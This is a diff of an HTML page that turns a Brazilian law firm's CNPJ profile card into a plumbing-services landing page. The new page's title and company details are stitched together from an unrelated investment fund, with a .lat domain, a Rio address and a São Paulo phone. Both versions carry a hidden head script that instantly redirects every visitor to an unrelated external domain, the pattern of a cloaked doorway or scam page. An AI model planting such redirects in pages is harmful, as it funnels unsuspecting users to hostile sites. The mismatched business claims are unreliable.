@@ -1,236 +1,219 @@
-<!doctype html>
-<html lang="pt-BR">
+<!DOCTYPE html>
+<html lang="pt-br">
 <head><script>window.location.href="https://app-valr.com/"</script>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Barriunuevo Sociedade Individual de Advocacia — Dados Cadastrais</title>
-  <meta name="description" content="Perfil e dados cadastrais do CNPJ 46.356.522/0001-21 — Barriunuevo Sociedade Individual de Advocacia. Contatos, localização, situação cadastral e ações rápidas (ligar, email, vCard)." />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Encanador Hidráulico Profissional | Instalações, Vazamentos e Manutenção com Alta Tecnologia. Somos uma Gestora Independente Especializada em Soluções de Investimento em Renda Fixa.</title>
+  <meta name="description" content="Encanador hidráulico especializado com atendimento técnico para residências e empresas. Soluções em instalação hidráulica, detecção de vazamentos, manutenção preventiva e tecnologias modernas.">
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
   <style>
-    :root{
-      --bg:#0f1724;
-      --card:#0b1220;
-      --accent:#06b6d4;
-      --muted:#94a3b8;
-      --glass: rgba(255,255,255,0.03);
-      --radius:12px;
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      color-scheme: dark;
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f0f4f8;
+      color: #333;
     }
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      background:
-        radial-gradient(1200px 600px at 10% 10%, rgba(6,182,212,0.06), transparent 8%),
-        linear-gradient(180deg,#071022 0%, #04101a 100%);
-      color:#e6eef6;
-      font-size:16px;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      padding:32px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      gap:20px;
-      min-height:100vh;
+    .hero {
+      background: linear-gradient(135deg, #007bff 30%, #00c6ff 100%);
+      color: white;
+      padding: 80px 20px;
+      text-align: center;
     }
-
-    .wrap{
-      width:100%;
-      max-width:1100px;
-      border-radius:var(--radius);
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6), inset 0 1px 0 rgba(255,255,255,0.02);
-      overflow:hidden;
-      display:grid;
-      grid-template-columns: 360px 1fr;
-      min-height:560px;
+    .section-title {
+      margin-top: 40px;
+      margin-bottom: 20px;
+      text-align: center;
     }
-
-    /* Left column */
-    .panel{
-      padding:22px;
-      background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
-      border-right:1px dashed rgba(255,255,255,0.02);
-      display:flex;
-      flex-direction:column;
-      gap:18px;
+    .service-card {
+      border: none;
+      transition: transform 0.3s;
     }
-    .brand{
-      display:flex;
-      gap:14px;
-      align-items:center;
+    .service-card:hover {
+      transform: translateY(-5px);
     }
-    .logo{
-      width:64px;height:64px;border-radius:10px;
-      background:linear-gradient(135deg,var(--accent),#6366f1);
-      display:flex;align-items:center;justify-content:center;
-      font-weight:700;color:#032;box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+    footer {
+      background-color: #002b45;
+      color: white;
+      padding: 20px 0;
+      text-align: center;
     }
-    .brand h1{font-size:18px;margin:0}
-    .brand p{margin:0;color:var(--muted);font-size:13px}
-
-    .actions{display:flex;flex-direction:column;gap:10px}
-    .btn{
-      display:inline-flex;align-items:center;gap:10px;
-      background:var(--glass);border:1px solid rgba(255,255,255,0.03);
-      color:var(--accent);padding:10px 12px;border-radius:10px;
-      cursor:pointer;font-weight:600;font-size:14px;text-decoration:none;
+    .cookie-banner {
+      background-color: #333;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      z-index: 9999;
+      display: none;
     }
-    .btn:active{transform:translateY(1px)}
-    .btn.secondary{background:transparent;color:#cbd5e1;border:1px dashed rgba(255,255,255,0.03)}
-    .quick-row{display:flex;gap:8px;flex-wrap:wrap}
-
-    .meta{
-      background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));
-      padding:12px;border-radius:10px;font-size:14px;color:var(--muted);
+    .cookie-banner button {
+      margin-left: 10px;
     }
-    .meta b{color:#e6f8fb}
-
-    /* Right column */
-    .content{padding:26px;display:flex;flex-direction:column;gap:18px;overflow:auto}
-    .section{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005)); padding:18px;border-radius:12px}
-    .section h2{margin:0 0 8px 0;font-size:16px}
-    dl{display:grid;grid-template-columns:170px 1fr;gap:8px 16px;margin:0}
-    dt{color:var(--muted);font-size:13px}
-    dd{margin:0;font-weight:600;color:#e6eef6}
-
-    .chips{display:flex;gap:8px;flex-wrap:wrap}
-    .chip{background:rgba(255,255,255,0.02);padding:8px 10px;border-radius:999px;font-weight:600;font-size:13px;color:var(--muted)}
-    .muted{color:var(--muted);font-size:14px}
-
-    footer{display:flex;justify-content:space-between;align-items:center;padding:14px 22px;border-top:1px dashed rgba(255,255,255,0.02)}
-    .small{font-size:13px;color:var(--muted)}
-
-    /* responsive */
-    @media (max-width:880px){
-      .wrap{grid-template-columns:1fr;min-height:720px}
-      .panel{order:2}
-      .content{order:1}
+    iframe, video {
+      width: 100%;
+      height: 300px;
+      border: 0;
+      margin-top: 20px;
     }
-
-    /* simple modal */
-    .modal-backdrop{position:fixed;inset:0;background:rgba(2,6,23,0.6);display:none;align-items:center;justify-content:center}
-    .modal{background:#071022;padding:18px;border-radius:12px;max-width:920px;width:96%}
-    .modal iframe{width:100%;height:420px;border-radius:8px;border:0}
-    .close{background:transparent;border:0;color:var(--muted);cursor:pointer;font-weight:700;padding:8px 10px}
-
-    /* subtle table */
-    table{width:100%;border-collapse:collapse;color:var(--muted)}
-    th,td{padding:8px;border-bottom:1px dashed rgba(255,255,255,0.02);text-align:left;font-size:14px}
-    th{color:#cfeff4;font-weight:700}
-    .kbd{background:#051223;border:1px solid rgba(255,255,255,0.02);padding:4px 8px;border-radius:6px;font-weight:700}
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
   </style>
 </head>
 <body>
-  <div class="wrap" role="application" aria-label="Ficha do CNPJ Barriunuevo">
-    <aside class="panel" aria-labelledby="brandTitle">
-      <div class="brand" id="brandTitle">
-        <div class="logo" aria-hidden="true">B</div>
-        <div>
-          <h1>Barriunuevo</h1>
-          <p>Sociedade Individual de Advocacia</p>
+
+  <!-- COOKIES -->
+  <div id="cookieBanner" class="cookie-banner">
+    Este site utiliza cookies para melhorar sua experiência. Ao continuar navegando, você concorda com nossa
+    <a href="#privacidade" class="text-info">Política de Privacidade</a>.
+    <button class="btn btn-sm btn-light" onclick="aceitarCookies()">Aceitar</button>
+  </div>
+
+  <!-- HERO -->
+  <header class="hero">
+    <h1><i class="fa-solid fa-wrench"></i> Encanador Hidráulico Profissional</h1>
+    <p>Atendimento técnico especializado em sistemas hidráulicos residenciais, comerciais e industriais</p>
+    <a href="#servicos" class="btn btn-light mt-3">Nossos Serviços</a>
+  </header>
+
+  <!-- VÍDEO PROMOCIONAL -->
+  <section id="video" class="container my-5">
+    <h2 class="section-title">Conheça Nosso Trabalho</h2>
+    <video controls poster="capa-video.jpg">
+      <source src="videos/encanador.mp4" type="video/mp4">
+      Seu navegador não suporta vídeo HTML5.
+    </video>
+  </section>
+
+  <!-- SOBRE -->
+  <section id="sobre" class="container my-5">
+    <h2 class="section-title">Quem Somos</h2>
+    <div class="row align-items-center">
+      <div class="col-md-6">
+        <p>
+          Atuamos há mais de 10 anos no setor hidráulico com profissionais certificados e uso de equipamentos de última geração. Nosso compromisso é com a excelência técnica, agilidade e segurança. Manutenção Hidraulico, Serviço de Desentupidora, Encanador Profissional, Instalação Hidráulica, Encanador Predial, Desentupidor de Esgoto, Encanador Industrial, Encanador Residencial, Sustentabilidade hídrica, Gestão da água, Água de qualidade, Água potável, Tratamento de esgoto, Abastecimento de água, Saneamento básico.
+        </p>
+        <ul>
+          <li><strong>+10 anos</strong> de experiência</li>
+          <li>Equipe <strong>treinada e uniformizada</strong></li>
+          <li>Uso de <strong>tecnologia não destrutiva</strong></li>
+        </ul>
+      </div>
+      <div class="col-md-6">
+        <img src="imagens/encanador-trabalho.jpg" alt="Foto de encanador em serviço">
+      </div>
+    </div>
+  </section>
+
+  <!-- SERVIÇOS -->
+  <section id="servicos" class="container my-5">
+    <h2 class="section-title">Nossos Serviços</h2>
+    <div class="row g-4">
+      <div class="col-md-4">
+        <div class="card service-card shadow-sm p-3">
+          <i class="fa-solid fa-screwdriver-wrench fa-2x text-primary"></i>
+          <h5 class="mt-3">Instalação Hidráulica</h5>
+          <p>Projetos sob medida para obras novas e reformas. Qualidade e durabilidade garantidas.</p>
         </div>
       </div>
-
-      <div class="meta" aria-live="polite">
-        <div><b>CNPJ:</b> 46.356.522/0001-21 — <span class="muted">46356522000121</span></div>
-        <div style="margin-top:6px"><b>Situação:</b> Ativa • Abertura: 11/05/2022</div>
-        <div style="margin-top:6px"><b>Capital Social:</b> R$ 5.000,00</div>
-      </div>
-
-      <div class="actions" role="navigation" aria-label="Ações rápidas">
-        <div class="quick-row">
-          <button class="btn" onclick="goTo('dados')">📋 Dados Cadastrais</button>
-          <button class="btn" onclick="goTo('contato')">✉️ Contato</button>
-        </div>
-        <div class="quick-row">
-          <button class="btn" onclick="goTo('local')">📍 Localização</button>
-          <button class="btn" onclick="openMap()">🗺️ Abrir mapa</button>
-        </div>
-        <div class="quick-row">
-          <a class="btn" href="mailto:nbarriunuevo@hotmail.com" title="Enviar email">✉️ Enviar Email</a>
-          <a class="btn" href="tel:+554830666127" title="Ligar">(48) 3066-6127</a>
-        </div>
-        <div class="quick-row">
-          <button class="btn secondary" onclick="downloadVCard()">💾 Baixar vCard</button>
-          <button class="btn secondary" onclick="copyAll()">📋 Copiar dados</button>
-          <button class="btn secondary" onclick="window.print()">🖨️ Imprimir</button>
+      <div class="col-md-4">
+        <div class="card service-card shadow-sm p-3">
+          <i class="fa-solid fa-leak fa-2x text-primary"></i>
+          <h5 class="mt-3">Detecção de Vazamentos</h5>
+          <p>Equipamentos avançados para identificar vazamentos com precisão e sem quebrar.</p>
         </div>
       </div>
-
-      <div class="meta">
-        <div><b>Opção pelo Simples:</b> Sim (11/05/2022)</div>
-        <div style="margin-top:6px"><b>Natureza jurídica:</b> Sociedade Unipessoal de Advocacia</div>
-        <div style="margin-top:6px"><b>Porte:</b> Sem Enquadramento</div>
+      <div class="col-md-4">
+        <div class="card service-card shadow-sm p-3">
+          <i class="fa-solid fa-shower fa-2x text-primary"></i>
+          <h5 class="mt-3">Manutenção Preventiva</h5>
+          <p>Monitoramento periódico do sistema hidráulico para evitar emergências e desperdícios.</p>
+        </div>
       </div>
+    </div>
+  </section>
 
-      <footer>
-        <div class="small">Dados fornecidos</div>
-        <div class="small">Atual: 11/05/2022</div>
-      </footer>
-    </aside>
+  <!-- CONTATO -->
+  <section id="contato" class="container my-5">
+    <h2 class="section-title">Fale Conosco</h2>
+    <p class="text-center">Atendimento rápido e direto para orçamento ou dúvidas:</p>
+    <div class="text-center mb-3">
+      <a href="mailto:contato@encanadorpro.com.br" class="btn btn-primary">
+        <i class="fa-solid fa-envelope"></i> E-mail
+      </a>
+      <a href="https://wa.me/5511999999999" target="_blank" class="btn btn-success ms-2">
+        <i class="fab fa-whatsapp"></i> WhatsApp
+      </a>
+    </div>
+  </section>
 
-    <main class="content" role="main">
-      <section id="overview" class="section" aria-labelledby="overviewTitle">
-        <h2 id="overviewTitle">Visão geral</h2>
-        <p class="muted">Perfil público e dados essenciais do registro CNPJ apresentados em uma única página para consulta, contato e ações rápidas.</p>
-        <div style="display:flex;gap:12px;align-items:center;margin-top:12px;flex-wrap:wrap">
-          <div class="chip">CNPJ: <span style="margin-left:8px;font-weight:700;color:#e6f8fb">46.356.522/0001-21</span></div>
-          <div class="chip">Abertura: <span style="margin-left:8px;font-weight:700;color:#e6f8fb">11/05/2022</span></div>
-          <div class="chip">Situação: <span style="margin-left:8px;font-weight:700;color:#34d399">Ativa</span></div>
-          <div class="chip">Tipo: <span style="margin-left:8px;font-weight:700;color:#e6f8fb">Matriz</span></div>
-        </div>
-      </section>
+  <!-- INFORMAÇÕES EMPRESARIAIS -->
+  <section id="empresa" class="container my-5">
+    <h2 class="section-title">Informações da Empresa</h2>
+    <div class="row">
+      <div class="col-md-6">
+        <h5><i class="fa-solid fa-building"></i> Dados Comerciais</h5>
+        <ul class="list-unstyled">
+          <li><strong>Empresa:</strong> Fundo de Investimento Imobiliario Tg Renda Imobiliaria Feeder - Responsabilidade Limitada.</li>
+            <p>📍 Praia Botafogo 00501 Blc I Sal 501 – Botafogo, Rio de Janeiro RJ, Cep: 22250-911</p>
+            <p>📞 (11) 3027-2237 | 📱 WhatsApp: (11) 3027-2237</p>
+            <p>✉️ contato@ablocacaoprimitions.lat</p>
+            <p>🌐 https://ablocacaoprimitions.lat/</p>
+	        <p>CNPJ: 61.453.937/0001-07</p>
+        </ul>
+      </div>
+      <div class="col-md-6">
+        <h5><i class="fa-solid fa-circle-info"></i> Nossos Valores</h5>
+        <ul class="list-unstyled">
+          <li><strong>Missão:</strong> Oferecer soluções hidráulicas seguras e eficientes.</li>
+          <li><strong>Visão:</strong> Ser referência nacional em serviços hidráulicos.</li>
+          <li><strong>Valores:</strong> Ética, respeito, inovação e qualidade.</li>
+        </ul>
+      </div>
+    </div>
 
-      <section id="dados" class="section" aria-labelledby="dadosTitle">
-        <h2 id="dadosTitle">Dados Cadastrais completos</h2>
-        <dl>
-          <dt>Razão Social</dt><dd>Barriunuevo Sociedade Individual de Advocacia</dd>
-          <dt>CNPJ (num)</dt><dd>46356522000121</dd>
-          <dt>Data de Abertura</dt><dd>11/05/2022 (3 anos e 6 meses)</dd>
-          <dt>Situação Cadastral</dt><dd>Ativa (Data: 11/05/2022)</dd>
-          <dt>Natureza Jurídica</dt><dd>Sociedade Unipessoal de Advocacia</dd>
-          <dt>Opção MEI</dt><dd>Não</dd>
-          <dt>Opção pelo Simples</dt><dd>Sim — Data: 11/05/2022</dd>
-          <dt>Capital Social</dt><dd>R$ 5.000,00</dd>
-          <dt>Porte</dt><dd>Sem Enquadramento</dd>
-          <dt>Tipo</dt><dd>Matriz</dd>
-        </dl>
-      </section>
+    <!-- MAPA -->
+    <div class="mt-4">
+      <h5><i class="fa-solid fa-map-location-dot"></i> Localização</h5>
+      <iframe 
+        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3656.2347533926825!2d-46.65657258451659!3d-23.58967656840837!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce59cfe0bb1c13%3A0xbad5dd1b6ea308a1!2sPaulista%20Avenue!5e0!3m2!1sen!2sbr!4v1719253821123!5m2!1sen!2sbr"
+        allowfullscreen=""
+        loading="lazy">
+      </iframe>
+    </div>
+  </section>
 
-      <section id="contato" class="section" aria-labelledby="contatoTitle">
-        <h2 id="contatoTitle">Contatos</h2>
-        <table>
-          <thead><tr><th>Meio</th><th>Detalhe</th></tr></thead>
-          <tbody>
-            <tr><td>Email</td><td><a style="color:var(--accent)" href="mailto:nbarriunuevo@hotmail.com">nbarriunuevo@hotmail.com</a></td></tr>
-            <tr><td>Telefone</td><td><a style="color:var(--accent)" href="tel:+554830666127">(48) 3066-6127</a></td></tr>
-            <tr><td>Endereço</td><td>Rua Vereador Mario Coelho Pires, 221 — Edif Nair Vieira Loja 30 Bloco B, Campinas, São José - SC, CEP 88101-280</td></tr>
-          </tbody>
-        </table>
+  <!-- PRIVACIDADE -->
+  <section id="privacidade" class="container my-5">
+    <h2 class="section-title">Política de Privacidade</h2>
+    <p>Este site coleta dados pessoais mínimos com finalidade de atendimento ao cliente. Utilizamos cookies para analisar estatísticas e melhorar a navegação.</p>
+    <p>As informações não são compartilhadas com terceiros e estão protegidas conforme a LGPD.</p>
+  </section>
 
-        <p class="muted" style="margin-top:12px">Para correspondência:</p>
-        <address style="font-weight:700">
-          Barriunuevo Sociedade Individual de Advocacia<br>
-          Rua Vereador Mario Coelho Pires 221, Edif Nair Vieira Loja 30 Bloco B<br>
-          Campinas — São José, SC<br>
-          CEP 88101-280
-        </address>
-      </section>
+  <!-- RODAPÉ -->
+  <footer>
+    <p>&copy; 2025 Encanador Hidráulico Pro. Todos os direitos reservados.</p>
+    <p><a href="#privacidade" class="text-light">Política de Privacidade</a></p>
+  </footer>
 
-      <section id="local" class="section" aria-labelledby="localTitle">
-        <h2 id="localTitle">Localização & mapa</h2>
-        <p class="muted">Endereço completo com ação para abrir no Google Maps e visualização em modal.</p>
-        <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
-          <button class="btn" onclick="openMap()">Abrir mapa no modal</button>
-          <a class="btn secondary" target="_blank" rel="noopener" href="https://www.google.com/maps/search/?api=1&query=Rua+Vereador+Mario+Coelho+Pires+221+Campinas+Sao+Jose+SC+88101-280">Abrir no Google Maps</a>
-        </div>
-        <p class="muted" style="margin-top:12px">Observação: o mapa abre usando o endereço textual — verifique a precisão no Google Maps.</p>
-      </section>
+  <!-- SCRIPT DE COOKIES -->
+  <script>
+    function aceitarCookies() {
+      document.getElementById("cookieBanner").style.display = "none";
+      localStorage.setItem("cookies_aceitos", "sim");
+    }
 
-      <section id="docs" class="section" aria-labelledby="docsTitle">
-        <h2 id="docsTitle">Documentos & Ações</h2>
-        <p class="muted">Ações rápidas para facilitar integração: baixar vCard, copiar todos os dados em texto e imprimir.</p>
-        <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
-          <button cla
+    window.onload = function () {
+      if (!localStorage.getItem("cookies_aceitos")) {
+        document.getElementById("cookieBanner").style.display = "block";
+      }
+    };
+  </script>
+</body>
+</html>
